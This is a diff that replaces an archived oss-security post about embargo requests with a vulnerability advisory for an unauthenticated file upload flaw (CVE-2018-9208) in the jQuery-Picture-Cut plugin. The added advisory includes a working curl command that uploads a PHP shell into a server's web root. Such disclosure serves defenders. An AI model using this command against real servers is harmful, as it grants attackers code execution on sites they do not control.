@@ -1,20 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/18/1
-Message-ID: <07f40446-1917-893c-2a87-b0d7990579b2@redhat.com>
-Date: Thu, 18 Jan 2018 17:10:05 +0100
-From: Florian Weimer <fweimer@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: How to deal with reporters who don't want their bugs fixed?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/20/7
+Message-id: <89E9855C-DA89-4F14-88BB-81AD23B76A20@me.com>
+Date: Tue, 20 Nov 2018 17:05:41 -0500
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta
 Content-Type: text/plain; charset=utf-8
 
-Subject says it all: What do you do if you receive a vulnerability 
-report, and the reporter requests an embargo at some time in the future 
-because that's when their paper/conference presentation/patent 
-submission is scheduled?
+Title: Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta
+Author: Larry W. Cashdollar, @_larry0
+Date: 2018-11-02
+CVE-ID:CVE-2018-9208
+CWE: CWE-434 arbitrary file upload
+Download Site: https://github.com/TuyoshiVinicius/jQuery-Picture-Cut
+Vendor: http://picturecut.tuyoshi.com.br/
+Vendor Notified: 2018-11-03
+Vendor Contact: tuyoshi_vinicius@...mail.com
+Advisory: http://www.vapidlabs.com/advisory.php?v=207
 
-The obvious approach is to find a prior public report of essentially the 
-same bug and fix that (which will work surprisingly often), but let's 
-assume that this isn't the case.
+Description: picture cut is a jquery plugin that handles images in a very friendly and simple way, with a beautiful interface based on bootstrap or jquery ui, has great features like ajax upload, drag image from explorer, image crop and others.
 
-Thanks,
-Florian
+Vulnerability:
+The code in jQuery-Picture-Cut/src/php/upload.php that calls ../core/PictureCut.php to handle the file upload does not check file type and allows the user to choose the file location path. An unauthenticated user and upload an executable PHP file to the server allowing code execution.
+
+Exploit Code:
+
+1. curl  -F  "inputOfFile=file" -F "request=upload" -F "enableResize=0" -F "minimumWidthToResize=0" -F "minimumHeightToResize=0" -F "folderOnServer=/" -F "imageNameRandom=1" -F "maximumSize=10000" -F "enableMaximumSize=0" -F "file=@...ll.php" http://example.com/jQuery-Picture-Cut/src/php/upload.php
+
+3. With folderOnServer=/ the shell will be in the main web directory path.
+
+
+
